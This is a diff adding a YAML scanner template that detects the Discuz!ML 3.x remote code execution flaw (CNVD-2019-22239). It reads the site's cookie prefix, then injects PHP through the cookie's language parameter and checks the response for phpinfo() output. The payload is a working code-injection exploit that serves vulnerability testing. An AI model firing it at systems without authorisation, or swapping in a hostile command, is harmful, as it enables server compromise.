@@ -1,0 +1,30 @@
+name: Discuz!ML_3.x_RCE_CNVD-2019-22239
+transport: http
+set: {}
+detail:
+  dock: app=discuz || body="Powered by Discuz! X3.4"
+  product: Discuz!ML
+  homepage: http://discuz.ml/
+  impact: July 11, 2019, Discuz! ML was found to have a remote code execution vulnerability
+    that allows an attacker to exploit remote code execution by inserting a constructed
+    payload into the language parameter in the cookie field of the request traffic.
+  description: Discuz!ML is a multilingual open-source engine for build your own community
+    like forum and social network. Based on the well-known Discuz!X engine by Tencent
+    Cloud (used to be Comsenz Inc.).
+rules:
+  r1:
+    method: GET
+    path: /forum.php
+    follow_redirects: false
+    output:
+      search_cookiepre: r'cookiepre = \'(?P<cookiepre>[\\w_]+)\''.bsubmatch(response.body)
+      var_cookiepre: search_cookiepre['cookiepre']
+    expression: response.status == 200
+  r2:
+    method: GET
+    path: /forum.php
+    follow_redirects: false
+    headers:
+      Cookie: '{{var_cookiepre}}language=sc''.phpinfo().'''
+    expression: response.status == 200 && response.body.bcontains(b'PHP Version') && response.body.bcontains(b'System')
+expression: r1() && r2()
